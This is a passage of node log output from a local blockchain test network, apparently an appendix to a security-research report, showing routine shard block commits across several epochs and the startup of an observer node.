[0;32mINFO [0m[2026-10-06 22:07:11.035] [process/block]      [0/2/52/(END_ROUND)] supernova transition is ready            [0;32mshard[0m = 0 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 [0;32mepoch[0m = 2 [0;32mround[0m = 52 
[0;32mINFO [0m[2026-10-06 22:07:15.021] [process/block]      [0/2/53/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 9e424fc756e7d48ac81bdc19a20824f6b38d2e53626e8475dd85a434399f9038 
[0;32mINFO [0m[2026-10-06 22:07:21.031] [process/block]      [0/2/54/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = 3538b19ce9ad03d99f8060ef759ea1fa32ac6982c50eda20cd2c67934e5336bc 
[0;32mINFO [0m[2026-10-06 22:07:27.021] [process/block]      [0/2/55/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = 68ec1297b966cacb680bb988ac42effa38afc9e580d72983b7006489825a80a2 
[0;32mINFO [0m[2026-10-06 22:07:33.016] [process/block]      [0/2/56/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = 608cd4a284caca7ddf70cb5e0aea914c3aa0fbc605d87601a06f834f221685ec 
[0;32mINFO [0m[2026-10-06 22:07:39.019] [process/block]      [0/2/57/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = 2131c5a99673d22dce03747566dc2288270ae224aa36d26002e94d843ee62900 
[0;32mINFO [0m[2026-10-06 22:07:45.018] [process/block]      [0/2/58/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = a68386bda3d914aef78d1a30b51f4f717c75debbf65123a4e1c1a5cf425b9e77 
[0;32mINFO [0m[2026-10-06 22:07:51.014] [process/block]      [0/2/59/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = 7465bca05cad5d9424100c1425e0d53a0d9b2087a6bd0a4cdae7d949344b615d 
[0;32mINFO [0m[2026-10-06 22:07:57.021] [process/block]      [0/2/60/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 57bfb935e64a756d45fb2e73d6172214a9fc6e2389737ecb2b0307c230151a14 
[0;32mINFO [0m[2026-10-06 22:08:03.019] [process/block]      [0/2/61/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = 71ff11a30aeb99162b207422b686d39d592699393155419997acfe39c561d4ed 
[0;32mINFO [0m[2026-10-06 22:08:09.018] [process/block]      [0/2/62/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 34cbab52b6d4fbf1890efdc4074c007fdb3003826d8d16b98d7ba813baff3283 
[0;32mINFO [0m[2026-10-06 22:08:15.021] [process/block]      [0/2/63/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 76a498ab7fc288982a6baa46f37d7f03644c420ad3d78be1ab4c8bd19df3417b 
[0;32mINFO [0m[2026-10-06 22:08:21.021] [process/block]      [0/2/64/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = f29bc614ab9bd58f8296f8dbe120dbe4fe8bbd3dc5dad4447e3252e450d917ec 
[0;32mINFO [0m[2026-10-06 22:08:27.019] [process/block]      [0/2/65/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = b9391d22672c7a2cb7083724286af774240bb58ac76abd635919365a63ea2b54 
[0;32mINFO [0m[2026-10-06 22:08:33.017] [process/block]      [0/2/66/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = bbd7c3bc2aafef38f22ba7338751b538de4aeae7118e536abca571f7eabcf462 
[0;32mINFO [0m[2026-10-06 22:08:39.015] [process/block]      [0/2/67/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = a4ab9a89a9ecd6c5ca3a95d458f27aedf481a75e7317e65d269081be621ba6d8 
[0;32mINFO [0m[2026-10-06 22:08:45.019] [process/block]      [0/2/68/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = 83cc45fe52ff0e0de000064eb406bf8af0291a3a1c96ea10eaed31d3fce15e89 
[0;32mINFO [0m[2026-10-06 22:08:51.019] [process/block]      [0/2/69/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = f7cd5d533d860982fd22ad45a10a44aaaaa8c3d318630338217975fc0f107f54 
[0;32mINFO [0m[2026-10-06 22:08:57.014] [process/block]      [0/2/70/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = 0d49f5ea35b970b6af2479b7f617ac6ba705d0348bbfb5444c60618ed6031b24 
[0;32mINFO [0m[2026-10-06 22:09:03.016] [process/block]      [0/2/71/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = cab0dddfc0c54296efd10e3a6c768cf65e05a014bc7450a70427319a866926ae 
[0;32mINFO [0m[2026-10-06 22:09:09.022] [process/block]      [0/2/72/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 0429c42bc61394cd44582550a68a72aaf0044e68de9923f8a11805294f983902 
[0;32mINFO [0m[2026-10-06 22:09:15.029] [process/block]      [0/2/73/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = 56aa8b0eeabdcd5e07003e9e20f023f8a2153d47d2cc8081468675415d717117 
[0;32mINFO [0m[2026-10-06 22:09:24.021] [process/block]      [0/3/74/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = acc0c67794d94f46df340547791ce1e9da2a46a07c24399227474395832153a2 
[0;32mINFO [0m[2026-10-06 22:09:27.021] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:27.021] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:29.119] [process/block]      [0/3/75/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e2f6bf4c84964ab371ac13f754590222a029382e7c4583ce2b1f12d358af2244 
[0;32mINFO [0m[2026-10-06 22:09:29.120] [state]              [0/3/75/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 2c473afb8c885d35d627983af2acb0bae6723a2099552c9bc2fb362441561d56 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:33.023] [process/block]      [0/3/76/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 03320edef061391af970a7278631dba85bcb8cdc1976a6d6610b7d77a0e85b0a 
[0;32mINFO [0m[2026-10-06 22:09:39.013] [process/block]      [0/3/77/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = a9b39869efb6b21d31131ffdf6b10983f3a8a1942fd299473a751ae9c1e8b32b 
[0;32mINFO [0m[2026-10-06 22:09:45.017] [process/block]      [0/3/78/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = c2df6b76de1588b28b1ec06cfa05c81c3933058b1c97ad9e5652b0dc9bf5ede8 
[0;32mINFO [0m[2026-10-06 22:09:51.023] [process/block]      [0/3/79/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = 4b0b3a4c9e3a679c8f38420cdf1645ad0da6df5c3be5cfe3d5b531df68908c33 
[0;32mINFO [0m[2026-10-06 22:09:57.020] [process/block]      [0/3/80/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = c125089cf86db66258ceaeeaaf307831269e6f927984381ba1327d1d2ebd9db7 
[0;32mINFO [0m[2026-10-06 22:10:03.021] [process/block]      [0/3/81/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = 00a057f4b042c2bef140bfab788d454b12becb77c2f1c00916503d55a857316c 
[0;32mINFO [0m[2026-10-06 22:10:09.017] [process/block]      [0/3/82/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 9809702a1e77c948885306d007bc4f808c900a4485f91164c1bffcc92244a18d 
[0;32mINFO [0m[2026-10-06 22:10:15.020] [process/block]      [0/3/83/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 8281c2d4b85db434674eddcd06b23edd60f1d8719a1c4e3173a8ece11833494d 
[0;32mINFO [0m[2026-10-06 22:10:21.016] [process/block]      [0/3/84/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 7617a76e3ed0a08125d4cc31372fc9faf667ee8781f754882cbc9554c2dc594b 
[0;32mINFO [0m[2026-10-06 22:10:27.029] [process/block]      [0/3/85/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = 38d25a0e5f43aaf12bf9ccce1fbca5866d05f0942613b579c505dee50bee70f2 
[0;32mINFO [0m[2026-10-06 22:10:33.017] [process/block]      [0/3/86/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 6711add0d388374d90aa72cde191e7a85bec19e461635eaf5eb41cb633836db8 
[0;32mINFO [0m[2026-10-06 22:10:39.017] [process/block]      [0/3/87/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 7c648ce0ac4bee03dd10c8ed577ecc38fd54b683bf2470b71bf1ca688ae0c7c3 
[0;32mINFO [0m[2026-10-06 22:10:45.017] [process/block]      [0/3/88/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 568996efae6f5dd82897a99442f959c7b3524380ac4058c1623ddf9c33cc9d74 
[0;32mINFO [0m[2026-10-06 22:10:51.031] [process/block]      [0/3/89/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 8e3efc51d7340a15b9ec97a76e08d2cd8f796df882eb52d49dd2da651b976d93 
[0;32mINFO [0m[2026-10-06 22:10:57.020] [process/block]      [0/3/90/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 777f9e331e8bc89ce35caef9ad66833f1c45c85fc833f9ee806e162d9fcbecc8 
[0;32mINFO [0m[2026-10-06 22:11:03.030] [process/block]      [0/3/91/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = 55cfa49c37fb227c9d6d2a11a7b5f576b3567a577abf1f87866453c10e0cd4b1 
[0;32mINFO [0m[2026-10-06 22:11:09.019] [process/block]      [0/3/92/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = d840d06c69b5bed70d30771423630c1a2f6c8bfb6f71cac0ec8334647eca1887 
[0;32mINFO [0m[2026-10-06 22:11:15.016] [process/block]      [0/3/93/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = 01e3691290f4845b1f61e94502fa26842d9524b8563a2b0c2ed2f7225db347eb 
[0;32mINFO [0m[2026-10-06 22:11:21.016] [process/block]      [0/3/94/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = 982c58e60487a5cfc307f5073005d5fe9859098e729e554e156519ed0382fad8 
[0;32mINFO [0m[2026-10-06 22:11:27.023] [process/block]      [0/3/95/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = 4bdf0dc4537cc235241a4eba59a1fb1d2610acaa127e06d86b158056fe17ca2e 
[0;32mINFO [0m[2026-10-06 22:11:33.019] [process/block]      [0/3/96/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = 3786d833a40cceaf8762d7efc194aaad48dbc2612ae4c15e7a23354b61597a3a 
[0;32mINFO [0m[2026-10-06 22:11:39.021] [process/block]      [0/3/97/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = 46f68051c07ec10a415e34657bbfee9193168c75e248dd61c0995a43352b4cff 
[0;32mINFO [0m[2026-10-06 22:11:45.005] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:45.007] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:47.014] [process/block]      [0/4/98/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 2e4ac356ca9669c64a52912eda71d8e7de3da77ae2a806a29b20744ff4631c20 
[0;32mINFO [0m[2026-10-06 22:11:47.018] [state]              [0/4/98/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 7abb6257950623b825e9971cfa6cf0373ea5b58fa0d712636b22661505fb7d59 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:51.024] [process/block]      [0/4/99/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 57fbb32eb6f3a9eb5f5623c6b9748eefaebbe036ad07a33c58b22a22a55b144e 
[0;32mINFO [0m[2026-10-06 22:11:57.024] [process/block]      [0/4/100/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 8cbcc4cdcb225e5eec1840e30f0006e362e6a30e3eb57bf59ca65bee72c6437a 
[0;32mINFO [0m[2026-10-06 22:12:03.020] [process/block]      [0/4/101/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 450e8f4588f2565befa1001767997f32d2f11dd9ce2369e0ff9f22be85003ea5 
[0;32mINFO [0m[2026-10-06 22:12:09.024] [process/block]      [0/4/102/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = 57b9b6c0a2a6739b3a5c157a947a8cb02691dbd1822ff4e631dcfd39259ef7d1 
[0;32mINFO [0m[2026-10-06 22:12:15.025] [process/block]      [0/4/103/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 511179cba9362c163d7feeca9d028c1a4dd6cc45a2515d05989ca0c95671b519 
[0;32mINFO [0m[2026-10-06 22:12:21.024] [process/block]      [0/4/104/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 8aa9fea6c45c0ed64ef2c08e8c653c10830f1b1265ca19d8d2766757de7d8e56 
[0;32mINFO [0m[2026-10-06 22:12:27.020] [process/block]      [0/4/105/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = eaeb13980d6f07abc88a4b4ca4e87df847d29786ed8ee39b1c9720fbf5080b0a 
[0;32mINFO [0m[2026-10-06 22:12:33.020] [process/block]      [0/4/106/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 4c5c2cc0f2b18af6ac405c90959097fa478eed25df39874449d4f6ba8cefee70 
[0;32mINFO [0m[2026-10-06 22:12:39.014] [process/block]      [0/4/107/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = 056af6eaff801fc3a8059f78b8cfd871acc5d4c54dccabb1ae9bfddec4c52a47 
[0;32mINFO [0m[2026-10-06 22:12:45.019] [process/block]      [0/4/108/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = d6e139f47f3abc2702da50d0529c9e63cbebc9a01758d58d70fc40b3b844153e 
[0;32mINFO [0m[2026-10-06 22:12:51.020] [process/block]      [0/4/109/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 823c47fc41a85d6529bbb4178d94a47d28d5955efbc87fc730583bb6d8b80e42 
[0;32mINFO [0m[2026-10-06 22:12:57.019] [process/block]      [0/4/110/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 8933812d04ebf44ae0d2a367683c712ec62d998f1ccec32096287b2835009f78 
[0;32mINFO [0m[2026-10-06 22:13:03.022] [process/block]      [0/4/111/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 43c2456e4d2d62be12454a14b96b4b13bbe0e74994d3fe6d14260b15d9fb0641 
[0;32mINFO [0m[2026-10-06 22:13:09.023] [process/block]      [0/4/112/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = f345e83e89725fbe2d64efa0f7be92e459896dd0b5e3c994f03694779deba00e 
[0;32mINFO [0m[2026-10-06 22:13:15.021] [process/block]      [0/4/113/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = 4f943afc72543df1df88e8bab5789f34907812e92ee4472dec8588cf57f953f1 
[0;32mINFO [0m[2026-10-06 22:13:21.021] [process/block]      [0/4/114/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 09c7f0261d7f8888c63634481d907138843629c129700342f8d5c007293a607f 
[0;32mINFO [0m[2026-10-06 22:13:27.019] [process/block]      [0/4/115/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = daf1c778ffcca84911d0a0b010bef5ace505641e875d30a2fc03df342c6275cd 
[0;32mINFO [0m[2026-10-06 22:13:33.020] [process/block]      [0/4/116/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 2552105ebc45c5ed645d436330de9bde9ac1917698bd72650e6b1ab645f43b58 
[0;32mINFO [0m[2026-10-06 22:13:39.019] [process/block]      [0/4/117/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 2af755a6438542af6047e6e12ed3b202ec3cf6842ccad316fe66025bd8a4a40e 
[0;32mINFO [0m[2026-10-06 22:13:45.016] [process/block]      [0/4/118/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = 4c9163ea7c209b0ec402ce8882c60167e2cfb1342ee67773c62f997a711389a8 
[0;32mINFO [0m[2026-10-06 22:13:51.024] [process/block]      [0/4/119/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 9c710ec3423c79d14e555f015ef7a46a8eaacaecdc87f18c4b01db0ea581be3e 
[0;32mINFO [0m[2026-10-06 22:13:57.021] [process/block]      [0/4/120/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = 135025b050731fbf52a29c6713fa9857c34130f09e62875416028d495e16691b 
[0;32mINFO [0m[2026-10-06 22:14:03.010] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:03.010] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:05.195] [process/block]      [0/5/121/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = ece8dc1f956fb9db80e03d8c821472451f09036203daa9d325fe10db91a9b1a1 
[0;32mINFO [0m[2026-10-06 22:14:05.195] [state]              [0/5/121/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = f50cefa3cc02078d8a54b3274d0a93b3ec3b3ab6a7dcf5ae6c7b2637b315514f [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:09.021] [process/block]      [0/5/122/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = ad1152637f6c272af3a4ac7f8ba8ebfd9b23e9515c33093ab020f40e46800d16 
[0;32mINFO [0m[2026-10-06 22:14:15.021] [process/block]      [0/5/123/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 7acf78ea4b645517c4b7951b2a7e1f37492ee9926ed4d626cda21274a70ae186 
[0;32mINFO [0m[2026-10-06 22:14:21.017] [process/block]      [0/5/124/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = bc9aa6f3c352f6d061e137ee0dd3f4d910417c3c76322114a3ebeb08d613fa5a 
[0;32mINFO [0m[2026-10-06 22:14:27.021] [process/block]      [0/5/125/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = 8e73a4e45df464fa7056e956d9270973ed1518a96d9f40ad5e134483902bd834 
[0;32mINFO [0m[2026-10-06 22:14:33.014] [process/block]      [0/5/126/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = e5290014b14df591eb3c2709822eee2b0347a463003ad3efd057d019393de1ca 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [0/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 6.1, observer1 full log

File `security-research/node-logs/observer1.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.373] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43278 
[0;32mINFO [0m[2026-10-06 22:01:39.375] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.379] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.412] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.421] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21101/p2p/16Uiu2HAmQ3jaCSPaf5EqJ56r4ns3FYfyTsX4LjKZz2MS4WdZnn9w [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21101/p2p/16Uiu2HAmQ3jaCSPaf5EqJ56r4ns3FYfyTsX4LjKZz2MS4WdZnn9w 
[0;32mINFO [0m[2026-10-06 22:01:39.423] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.423] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:01:59.433] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 0 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.441] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.705] [..nodesCoordinator] [0/0/0/]       new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.718] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.720] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.061] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
